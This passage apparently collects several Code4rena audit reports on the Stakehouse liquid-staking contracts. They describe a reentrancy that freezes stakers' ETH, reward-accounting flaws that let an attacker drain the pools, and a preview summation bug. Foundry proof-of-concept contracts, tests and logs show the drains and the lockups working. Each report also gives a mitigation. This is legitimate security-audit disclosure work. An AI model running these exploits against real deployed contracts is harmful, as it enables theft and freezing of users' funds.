          getAddressArrayFromValues(address(manager2.stakingFundsVault())), +            blsPubKeyTwoInput); +        vm.stopPrank(); +        assertEq(feesAndMevUserTwo.balance, 1 ether); + +        // At this point, user 1 ought to have accumulated 1 ether from the rewards, +        // however accumulated eth is listed as 0. +        // The reason is that when the giant pool tokens were transferred to +        // user two, the claimed[] value for user one was left unchanged. +        assertEq( +            giantFeesAndMevPool.previewAccumulatedETH( +                feesAndMevUserOne, +                new address[](0), +                new LPToken[][](0)), +                0); + +        // The pool has received 4 eth rewards and paid out 3, but no users +        // are listed as having accumulated the eth. It is orphaned. +        assertEq(giantFeesAndMevPool.totalRewardsReceived(), 4 ether); +        assertEq(giantFeesAndMevPool.totalClaimed(), 3 ether); + +        assertEq( +            giantFeesAndMevPool.previewAccumulatedETH( +                feesAndMevUserTwo, +                new address[](0), +                new LPToken[][](0)), +                0); + +    } +  } \ No newline at end of file  ``` ## Tools Used  ## Recommended Mitigation Steps Reduce claimed[] when necessary on the from side when GiantMevAndFeesPool tokens are transferred. Alternatively, claimed[] could be calculated on a per share basis rather than a total basis in order to simplify some of the adjustments that must be made in the code for claimed[].
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L934 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L524   # Vulnerability details  ## Impact  * Permanent freeze of funds - users who deposited ETH for staking will not be able to receive their funds, rewards or rotate to another token. The protocol becomes insolvent, it cannot pay anything to the users. * Protocol's LifecycleStatus state machine is broken   Other impacts: * Users deposit funds to an unstakable validator (node runner has already took out his funds)  Impact is also on the Giant Pools that give liquidity to the vaults.  A competitor or malicious actor can cause bad PR for the protocol by causing permanent freeze of user funds at LSD stakehouse. ## Proof of Concept  There are two main bugs that cause the above impact: 1. Reentrancy bug in `withdrawETHForKnot` function in `LiquidStakingManager.sol` 2. Improper balance check in `LiquidStakingManager.sol` for deposited node runner funds.   For easier reading and understanding, please follow the bellow full attack flow diagram when reading through the explanation. ``` ┌───────────┐               ┌───────────┐            ┌───────────┐              ┌───────────┐ │           │               │           │            │           │              │           │ │Node Runner│               │LSD Manager│            │   Vaults  │              │   Users   │ │           │               │           │            │           │              │           │ └─────┬─────┘               └─────┬─────┘            └─────┬─────┘              └─────┬─────┘       │                           │                        │                          │       │   Register BLS Key #1     │                        │                          │       ├──────────────────────────►│                        │                          │       │                           │                        │                          │       │   Register BLS Key #1     │                        │                          │       ├──────────────────────────►│                        │Deposit 24 ETH to savETH  │       │                           │                        │◄─────────────────────────┤       │                           │                        │                          │       │                           │                        │Deposit 4 ETH to mevAndFees       │                           │                        │◄─────────────────────────┐       │WithdrawETHForKnot BLS #1  │                        │                          │       ├──────────────────────────►│                        │                          │       │       Send 4 ETH          │                        │                          │       │◄──────────────────────────┤                        │                          │       │ Reenter stake function    │                        │                          │       ├──────────────────────────►│Get 28 ETH from vaults  │                          │       │                           ├───────────────────────►│                          │       │ ┌───────────────────────┐ │     Send 28 ETH        │                          │       │ │ Stake complete.       │ │◄───────────────────────┤                          │       │ │status=DEPOSIT_COMPLETE│ │                        │                          │       │ └───────────────────────┘ │                        │                          │       │Finished WithdrawETHForKnot│                        │                          │       │◄──────────────────────────┤                        │Users cannot mint derivati│es       │                           │                        │◄─────────────────────────┤       │    ┌──────────────────┐   │                        │Users cannot burnLPTokens │       │    │BLS Key #1 banned │   │                        │◄─────────────────────────┤       │    └──────────────────┘   │                        │Users cannot rotateTokens │       │                           │                        │◄─────────────────────────┤       │                           │                        │                          │ ```  Lets assume the following starting point: 1. Node runner registered and paid 4 ETH for BLS KEY #1 2. Node runner registered and paid 4 ETH for BLS KEY #2 3. savETH users collected 24 ETH ready for staking 4. mevAndFess users collected 4 ETH ready for staking   **Reentrancy in `withdrawETHForKnot`**:  `withdrawETHForKnot` is a function used in `LiquidStakingManager`. It is used to refund a node runner if funds are not yet staked and BAN the BLS key.  `withdrawETHForKnot`: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326 ```     function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external { ....         IOwnableSmartWallet(associatedSmartWallet).rawExecute(             _recipient,             "",             4 ether         ); ....         bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;     } ```  The associatedSmartWallet will send the node runner 4 ETH (out of 8 currently in balance).   Please note: 1.  The Node Runner can reenter the `LiquidStakingManager` when receiving the 4 ETH 2. `bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;` is only executed after the reentrancy  We can call any method we need with the following states: * BLS key is NOT banned * Status is `IDataStructures.LifecycleStatus.INITIALS_REGISTERED`  The node runner will call the `stake` function to stake the deposited funds from the vaults and change the status to `IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE`  `stake`: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L524  ```     function stake(         bytes[] calldata _blsPublicKeyOfKnots,         bytes[] calldata _ciphertexts,         bytes[] calldata _aesEncryptorKeys,         IDataStructures.EIP712Signature[] calldata _encryptionSignatures,         bytes32[] calldata _dataRoots     ) external { ....             // check if BLS public key is registered with liquid staking derivative network and not banned             require(isBLSPublicKeyBanned(blsPubKey) == false, "BLS public key is banned or not a part of LSD network"); ....             require(                 getAccountManager().blsPublicKeyToLifecycleStatus(blsPubKey) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,                 "Initials not registered"             ); ....             _assertEtherIsReadyForValidatorStaking(blsPubKey);              _stake(                 _blsPublicKeyOfKnots[i],                 _ciphertexts[i],                 _aesEncryptorKeys[i],                 _encryptionSignatures[i],                 _dataRoots[i]             ); ....     } ```  The `stake` function checks  1. That the BLS key is not banned. In our case its not yet banned, because the banning happens after the reentrancy 2. IDataStructures.LifecycleStatus.INITIALS_REGISTERED is the current Lifecycle status. Which it is.  3. There is enough balance in the vaults and node runners smart wallet in `_assertEtherIsReadyForValidatorStaking`  `_assertEtherIsReadyForValidatorStaking`  checks that the node runners smart wallet has more than 4 ETH.  Because our node runner has two BLS keys registered, there is an additional 4 ETH on BLS Key #2 and the conditions will pass.   `_assertEtherIsReadyForValidatorStaking` https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L934 ```     function _assertEtherIsReadyForValidatorStaking(bytes calldata blsPubKey) internal view {         address associatedSmartWallet = smartWalletOfKnot[blsPubKey];         require(associatedSmartWallet.balance >= 4 ether, "Smart wallet balance must be at least 4 ether");          LPToken stakingFundsLP = stakingFundsVault.lpTokenForKnot(blsPubKey);         require(address(stakingFundsLP) != address(0), "No funds staked in staking funds vault");         require(stakingFundsLP.totalSupply() == 4 ether, "DAO staking funds vault balance must be at least 4 ether");          LPToken savETHVaultLP = savETHVault.lpTokenForKnot(blsPubKey);         require(address(savETHVaultLP) != address(0), "No funds staked in savETH vault");         require(savETHVaultLP.totalSupply() == 24 ether, "KNOT must have 24 ETH in savETH vault");     } ```  Since we can pass all checks. `_stake` will be called which withdraws all needed funds from the vault and executes a call through the smart wallet to the `TransactionRouter` with 32 ETH needed for the stake. The `TransactionRouter` will process the funds and stake them. The `LifecycleStatus` will be updated to `IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE`  `_stake`: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L739 ```     function _stake(         bytes calldata _blsPublicKey,         bytes calldata _cipherText,         bytes calldata _aesEncryptorKey,         IDataStructures.EIP712Signature calldata _encryptionSignature,         bytes32 dataRoot     ) internal {         address smartWallet = smartWalletOfKnot[_blsPublicKey];          // send 24 ether from savETH vault to smart wallet         savETHVault.withdrawETHForStaking(smartWallet, 24 ether);          // send 4 ether from DAO staking funds vault         stakingFundsVault.withdrawETH(smartWallet, 4 ether);          // interact with transaction router using smart wallet to deposit 32 ETH         IOwnableSmartWallet(smartWallet).execute(             address(getTransactionRouter()),             abi.encodeWithSelector(                 ITransactionRouter.registerValidator.selector,                 smartWallet,                 _blsPublicKey,                 _cipherText,                 _aesEncryptorKey,                 _encryptionSignature,                 dataRoot             ),             32 ether         ); ....     } ```  After `_stake` and `stake` will finish executing we will finish the Cross-Function Reentrancy.   The protocol has entered the following state for the BLS key #1: 1. BLS Key #1 is banned 2. LifecycleStatus is `IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE`  In such a state where the key is banned, no one can mint derivatives and therefor depositors cannot withdraw rewards/dETH:  `mintDerivatives`: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L577 ```     function mintDerivatives(         bytes[] calldata _blsPublicKeyOfKnots,         IDataStructures.ETH2DataReport[] calldata _beaconChainBalanceReports,         IDataStructures.EIP712Signature[] calldata _reportSignatures     ) external { ....             // check if BLS public key is registered and not banned             require(isBLSPublicKeyBanned(_blsPublicKeyOfKnots[i]) == false, "BLS public key is banned or not a part of LSD network"); .... ```  Vault LP Tokens cannot be burned for withdraws because that is not supported in DEPOSIT_COMPLETE state:  `burnLPToken`: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SavETHVault.sol#L126 ```     function burnLPToken(LPToken _lpToken, uint256 _amount) public nonReentrant returns (uint256) { ...         bytes memory blsPublicKeyOfKnot = KnotAssociatedWithLPToken[_lpToken];         IDataStructures.LifecycleStatus validatorStatus = getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfKnot);          require(             validatorStatus == IDataStructures.LifecycleStatus.INITIALS_REGISTERED ||             validatorStatus == IDataStructures.LifecycleStatus.TOKENS_MINTED,             "Cannot burn LP tokens"         ); .... ```  Tokens cannot be rotated to other LP tokens because that is not supported in a DEPOSIT_COMPLETE state   `rotateLPTokens` ```     function rotateLPTokens(LPToken _oldLPToken, LPToken _newLPToken, uint256 _amount) public { ...         bytes memory blsPublicKeyOfPreviousKnot = KnotAssociatedWithLPToken[_oldLPToken]; ...         require(             getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfPreviousKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,             "Lifecycle status must be one"         ); ... ```  Funds are stuck, they cannot be taken or used.  The LifecycleStatus is also stuck, tokens cannot be minted.   ### Foundry POC:  The POC will showcase the scenario in the diagram.  Add the following contracts to `liquid-staking` folder: https://github.com/coade-423n4/2022-11-stakehouse/tree/main/contracts/testing/liquid-staking ``` // SPDX-License-Identifier: MIT  pragma solidity 0.8.13;  import { LiquidStakingManager } from "../../liquid-staking/LiquidStakingManager.sol"; import { TestUtils } from "../../../test/utils/TestUtils.sol";  contract NodeRunner {     bytes blsPublicKey1;     LiquidStakingManager manager;     TestUtils testUtils;      constructor(LiquidStakingManager _manager, bytes memory _blsPublicKey1, bytes memory _blsPublicKey2, address _testUtils) payable public {         manager = _manager;         blsPublicKey1 = _blsPublicKey1;         testUtils = TestUtils(_testUtils);         //register BLS Key #1         manager.registerBLSPublicKeys{ value: 4 ether }(             testUtils.getBytesArrayFromBytes(blsPublicKey1),             testUtils.getBytesArrayFromBytes(blsPublicKey1),             address(0xdeadbeef)         );         // Register BLS Key #2         manager.registerBLSPublicKeys{ value: 4 ether }(             testUtils.getBytesArrayFromBytes(_blsPublicKey2),             testUtils.getBytesArrayFromBytes(_blsPublicKey2),             address(0xdeadbeef)         );     }     receive() external payable {         testUtils.stakeSingleBlsPubKey(blsPublicKey1);     } } ```  Add the following imports to `LiquidStakingManager.t.sol` https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12 ``` import { NodeRunner } from "../../contracts/testing/liquid-staking/NodeRunner.sol"; import { IDataStructures } from "@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IDataStructures.sol"; ```  Add the following test to `LiquidStakingManager.t.sol` https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L121 ```     function testLockStakersFunds() public {         uint256 startAmount = 8 ether;         // Create NodeRunner. Constructor registers two BLS Keys         address nodeRunner = address(new NodeRunner{value: startAmount}(manager, blsPubKeyOne, blsPubKeyTwo, address(this)));                  // Simulate state transitions in lifecycle status to initials registered (value of 1)         MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 1);          // savETHUser, feesAndMevUser funds used to deposit into validator BLS key #1         address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);         address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);                  // deposit savETHUser, feesAndMevUser funds for validator #1         depositIntoDefaultSavETHVault(savETHUser, blsPubKeyOne, 24 ether);         depositIntoDefaultStakingFundsVault(feesAndMevUser, blsPubKeyOne, 4 ether);          // withdraw ETH for first BLS key and reenter         // This will perform a cross-function reentracy to call stake         vm.startPrank(nodeRunner);         manager.withdrawETHForKnot(nodeRunner, blsPubKeyOne);         // Simulate state transitions in lifecycle status to ETH deposited (value of 2)         // In real deployment, when stake is called TransactionRouter.registerValidator is called to change the state to DEPOSIT_COMPLETE          MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 2);         vm.stopPrank();                  // Validate mintDerivatives reverts because of banned public key          (,IDataStructures.ETH2DataReport[] memory reports) = getFakeBalanceReport();         (,IDataStructures.EIP712Signature[] memory sigs) = getFakeEIP712Signature();         vm.expectRevert("BLS public key is banned or not a part of LSD network");         manager.mintDerivatives(             getBytesArrayFromBytes(blsPubKeyOne),             reports,             sigs         );          // Validate depositor cannot burn LP tokens         vm.startPrank(savETHUser);         vm.expectRevert("Cannot burn LP tokens");         savETHVault.burnLPTokensByBLS(getBytesArrayFromBytes(blsPubKeyOne), getUint256ArrayFromValues(24 ether));         vm.stopPrank();     }  ```  To run the POC execute: `yarn test -m testLockStakersFunds -v `  Expected output: ``` Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests [PASS] testLockStakersFunds() (gas: 1731537) Test result: ok. 1 passed; 0 failed; finished in 8.21ms ```  To see the full trace, execute: `yarn test -m testLockStakersFunds -vvvv` ## Tools Used  VS Code, Foundry  ## Recommended Mitigation Steps  1. Add a reentrancy guard to `withdrawETHForKnot` and `stake` 2. Keep proper accounting for ETH deposited by node runner for each BLS key 
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126-L138 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L176-L178   # Vulnerability details  ## Impact The contract GiantMevAndFeesPool override the function totalRewardsReceived: ``` return address(this).balance + totalClaimed - idleETH; ``` The function totalRewardsReceived is used as the current rewards balance to caculate the unprocessed rewards in the function `SyndicateRewardsProcessor._updateAccumulatedETHPerLP` ``` uint256 received = totalRewardsReceived(); uint256 unprocessed = received - totalETHSeen; ```  The idleETH will be decreased in the function `batchDepositETHForStaking` for sending eth to the staking pool. But the idleETH wont be increased in the function `bringUnusedETHBackIntoGiantPool` which is used to burn lp tokens in the staking pool, and the staking pool will send the eth back to the giant pool. And then because of the diminution of the idleETH, the `accumulatedETHPerLPShare` is added out of thin air. So the attacker can steal more eth from the GiantMevAndFeesPool.  ## Proof of Concept test: test/foundry/TakeFromGiantPools.t.sol ``` pragma solidity ^0.8.13;  // SPDX-License-Identifier: MIT  import "forge-std/console.sol"; import {GiantPoolTests} from "./GiantPools.t.sol"; import { LPToken } from "../../contracts/liquid-staking/LPToken.sol";  contract TakeFromGiantPools is GiantPoolTests {     function testDWclaimRewards() public{         address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);         address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 4 ether);         address feesAndMevUserTwo = accountThree; vm.deal(feesAndMevUserTwo, 4 ether);          // Register BLS key         registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);          // Deposit ETH into giant fees and mev         vm.startPrank(feesAndMevUserOne);         giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);         vm.stopPrank();         vm.startPrank(feesAndMevUserTwo);         giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);          bytes[][] memory blsKeysForVaults = new bytes[][](1);         blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);          uint256[][] memory stakeAmountsForVaults = new uint256[][](1);         stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether);         giantFeesAndMevPool.batchDepositETHForStaking(             getAddressArrayFromValues(address(manager.stakingFundsVault())),             getUint256ArrayFromValues(4 ether),             blsKeysForVaults,             stakeAmountsForVaults         );         vm.warp(block.timestamp+31 minutes);         LPToken[] memory tokens = new LPToken[](1);         tokens[0] = manager.stakingFundsVault().lpTokenForKnot(blsPubKeyOne);          LPToken[][] memory allTokens = new LPToken[][](1);         allTokens[0] = tokens;         giantFeesAndMevPool.bringUnusedETHBackIntoGiantPool(             getAddressArrayFromValues(address(manager.stakingFundsVault())),             allTokens,             stakeAmountsForVaults         );         // inject a NOOP to skip some functions         address[] memory stakingFundsVaults = new address[](1);         bytes memory code = new bytes(1);         code[0] = 0x00;         vm.etch(address(0x123), code);         stakingFundsVaults[0] = address(0x123);         giantFeesAndMevPool.claimRewards(feesAndMevUserTwo, stakingFundsVaults, blsKeysForVaults);         vm.stopPrank();         console.log("user one:", getBalance(feesAndMevUserOne));         console.log("user two(attacker):", getBalance(feesAndMevUserTwo));         console.log("giantFeesAndMevPool:", getBalance(address(giantFeesAndMevPool)));     }      function getBalance(address addr) internal returns (uint){         // giant LP : eth at ratio of 1:1         return addr.balance + giantFeesAndMevPool.lpTokenETH().balanceOf(addr);     }  } ```  run test: ``` forge test --match-test testDWclaimRewards -vvv ```  test log: ``` Logs:   user one: 4000000000000000000   user two(attacker): 6000000000000000000   giantFeesAndMevPool: 6000000000000000000 ``` The attacker stole 2 eth from the pool.  ## Tools Used fodunry  ## Recommended Mitigation Steps Add  ``` idleETH += _amounts[i]; ``` before burnLPTokensForETH in the GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPool function.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L82 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L91   # Vulnerability details  ## Impact The `GiantMevAndFeesPool.previewAccumulatedETH` function ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L82](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L82)) allows to view the ETH that is accumulated by an address.    However the formula is not correct.    In each iteration of the foor loop, `accumulated` is assigned a new value ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L91](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L91)) when actually the value should be updated like this:   ```solidity accumulated += StakingFundsVault(payable(_stakingFundsVaults[i])).batchPreviewAccumulatedETH(         address(this),         _lpTokens[i]     ); ```  Obviously the `accumulated` value must be calculated for all stakingFundVaults not only for one stakingFundsVault.    While this calculation is not used internally by the contract, it will cause any third-party contract that relies on this calculation to behave incorrectly.    For example a third party smart contract might only allow users to withdraw once the value returned by `previewAccumulatedETH` reaches a certain threshold. Because of the issue however the accumulated ETH value that is returned will always be too low.    ## Tools Used VSCode  ## Recommended Mitigation Steps Fix:   ```solidity @@ -88,7 +88,7 @@ contract GiantMevAndFeesPool is ITransferHookProcessor, GiantPoolBase, Syndicate            uint256 accumulated;          for (uint256 i; i < _stakingFundsVaults.length; ++i) { -            accumulated = StakingFundsVault(payable(_stakingFundsVaults[i])).batchPreviewAccumulatedETH( +            accumulated += StakingFundsVault(payable(_stakingFundsVaults[i])).batchPreviewAccumulatedETH(                  address(this),                  _lpTokens[i]              ); ```
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L127 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L116 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L22   # Vulnerability details  ## Impact The `GiantSavETHVaultPool` and `GiantMevAndFeesPool` both have a `batchRotateLPTokens` function that allows to move staked ETH to another key.    Both functions require that the GiantLP balance of the sender is `>=0.5 ether`.    [https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L127](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L127)    [https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L116](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L116)    The reason for this is that there is a `common interest` needed in order to rotate LP Tokens.    The way this is implemented right now does not serve this purpose and even makes the functions unable to be called in some cases.    The `MIN_STAKING_AMOUNT` for the GiantPools is `0.001 ether` ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L22](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L22)).    So a user should expect that this amount is sufficient to properly use the contract.    However even if there are multiple users paying into the GiantPool, they might not reach the 0.5 ETH threshold to call the function.    So even if they would use some kind of multisig wallet to call the `batchRotateLPTokens` function, it would not be possible.    Also the threshold does not scale.    Imagine that User A puts 100 ETH into the GiantPool. Another User B puts 0.5 ETH into the GiantPool.    Can we speak of "common interest" when User B wants to rotate the LP Tokens?    ## Tools Used VSCode  ## Recommended Mitigation Steps My suggestion is to use a formula like:   `require(lpTokenETH.balanceOf(msg.sender) >= (lpTokenETH.totalSupply() / CONSTANT_VALUE))`.   Where you can choose a CONSTANT_VALUE like 20 or 50.    This properly scales the required amount and helps mitigate both scenarios.  
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L63 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L88   # Vulnerability details  ## Impact The SyndicateRewardsProcessor's internal `_distributeETHRewardsToUserForToken()` function is called from external `claimRewards()` function in the `StakingFundsVault` contract. This function is called by LP Token holders to claim their accumulated rewards based on their LP Token holdings and already claimed rewards. The accumulated rewards `due` are calculated as `((accumulatedETHPerLPShare * balance) / PRECISION)` reduced by the previous claimed amount stored in `claimed[_user][_token]`. When the ETH is sent to the `_user` the stored value should be increased by the `due` amount. However in the current code base the `claimed[_user][_token]` is set equal to the calculated `due`.  ```solidity function _distributeETHRewardsToUserForToken(         address _user,         address _token,         uint256 _balance,         address _recipient     ) internal {         require(_recipient != address(0), "Zero address");         uint256 balance = _balance;         if (balance > 0) {             // Calculate how much ETH rewards the address is owed / due              uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];             if (due > 0) {                 claimed[_user][_token] = due;                 totalClaimed += due;                 (bool success, ) = _recipient.call{value: due}("");     ...    }         }     } ```  This means the first time a user will claim their rewards they will get the correct amount and the correct value will be stored in the `claimed[_user][_token]`.  When extra ETH is recieved from the MEV and fees rewards and the user claims their reward again, the claimed amount will only reflect the last claimed amount. As a result they can then repeatedly claim untill the MEV and Fee vault is almost depleted.  ## Proof of Concept Following modification to the existing `StakingFundsVault.t.sol` will provide a test to demonstrate the issue: ```diff diff --git a/test/foundry/StakingFundsVault.t.sol b/test/foundry/StakingFundsVault.t.sol index 53b4ce0..4db8fc8 100644 --- a/test/foundry/StakingFundsVault.t.sol +++ b/test/foundry/StakingFundsVault.t.sol @@ -4,6 +4,7 @@ import "forge-std/console.sol";    import { StakingFundsVault } from "../../contracts/liquid-staking/StakingFundsVault.sol";  import { LPToken } from "../../contracts/liquid-staking/LPToken.sol"; +import { SyndicateRewardsProcessor} from "../../contracts/liquid-staking/SyndicateRewardsProcessor.sol";  import {      TestUtils,      MockLSDNFactory, @@ -417,4 +418,73 @@ contract StakingFundsVaultTest is TestUtils {          assertEq(vault.totalClaimed(), rewardsAmount);          assertEq(vault.totalRewardsReceived(), rewardsAmount);      } + +    function testRepetitiveClaim() public { +        // register BLS key with the network +        registerSingleBLSPubKey(accountTwo, blsPubKeyFour, accountFive); + +        vm.label(accountOne, "accountOne"); +        vm.label(accountTwo, "accountTwo"); +        // Do a deposit of 4 ETH for bls pub key four in the fees and mev pool +        depositETH(accountTwo, maxStakingAmountPerValidator / 2, getUint256ArrayFromValues(maxStakingAmountPerValidator / 2), getBytesArrayFromBytes(blsPubKeyFour)); +        depositETH(accountOne, maxStakingAmountPerValidator / 2, getUint256ArrayFromValues(maxStakingAmountPerValidator / 2), getBytesArrayFromBytes(blsPubKeyFour)); + +        // Do a deposit of 24 ETH for savETH pool +        liquidStakingManager.savETHVault().depositETHForStaking{value: 24 ether}(blsPubKeyFour, 24 ether); + +        stakeAndMintDerivativesSingleKey(blsPubKeyFour); + +        LPToken lpTokenBLSPubKeyFour = vault.lpTokenForKnot(blsPubKeyFour); + +        vm.warp(block.timestamp + 3 hours); + +        // Deal ETH to the staking funds vault +        uint256 rewardsAmount = 1.2 ether; +        console.log("depositing %s wei into the vault.\n", rewardsAmount); +        vm.deal(address(vault), rewardsAmount); +        assertEq(address(vault).balance, rewardsAmount); +        assertEq(vault.previewAccumulatedETH(accountOne, vault.lpTokenForKnot(blsPubKeyFour)), rewardsAmount / 2); +        assertEq(vault.previewAccumulatedETH(accountTwo, vault.lpTokenForKnot(blsPubKeyFour)), rewardsAmount / 2); + +        logAccounts(); + +        console.log("Claiming rewards for accountOne.\n"); +        vm.prank(accountOne); +        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour)); +        logAccounts(); + +        console.log("depositing %s wei into the vault.\n", rewardsAmount); +        vm.deal(address(vault), address(vault).balance + rewardsAmount); +        vm.warp(block.timestamp + 3 hours); +        logAccounts(); + +        console.log("Claiming rewards for accountOne.\n"); +        vm.prank(accountOne); +        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour)); +        logAccounts(); + +        console.log("Claiming rewards for accountOne AGAIN.\n"); +        vm.prank(accountOne); +        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour)); +        logAccounts(); + +        console.log("Claiming rewards for accountOne AGAIN.\n"); +        vm.prank(accountOne); +        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour)); +        logAccounts(); + +        //console.log("Claiming rewards for accountTwo.\n"); +        vm.prank(accountTwo); +        vault.claimRewards(accountTwo, getBytesArrayFromBytes(blsPubKeyFour)); + +    } + +    function logAccounts() internal { +        console.log("accountOne previewAccumulatedETH : %i", vault.previewAccumulatedETH(accountOne, vault.lpTokenForKnot(blsPubKeyFour))); +        console.log("accountOne claimed               : %i", SyndicateRewardsProcessor(vault).claimed(accountOne, address(vault.lpTokenForKnot(blsPubKeyFour)))); +        console.log("accountTwo previewAccumulatedETH : %i", vault.previewAccumulatedETH(accountTwo, vault.lpTokenForKnot(blsPubKeyFour))); +        console.log("accountTwo claimed               : %i", SyndicateRewardsProcessor(vault).claimed(accountTwo, address(vault.lpTokenForKnot(blsPubKeyFour)))); +        console.log("ETH Balances: accountOne: %i, accountTwo: %i, vault: %i\n", accountOne.balance, accountTwo.balance, address(vault).balance); +    } +  }  ```  Note that the AccountOne repeatedly claims until the vault is empty and the claim for accountTwo fails.  Following is an output of the test script showing the balances and differnet state variables: ``` forge test -vv --match testRepetitiveClaim [⠑] Compiling... No files changed, compilation skipped  Running 1 test for test/foundry/StakingFundsVault.t.sol:StakingFundsVaultTest [FAIL. Reason: Failed to transfer] testRepetitiveClaim() (gas: 3602403) Logs:   depositing 1200000000000000000 wei into the vault.    accountOne previewAccumulatedETH : 600000000000000000   accountOne claimed               : 0   accountTwo previewAccumulatedETH : 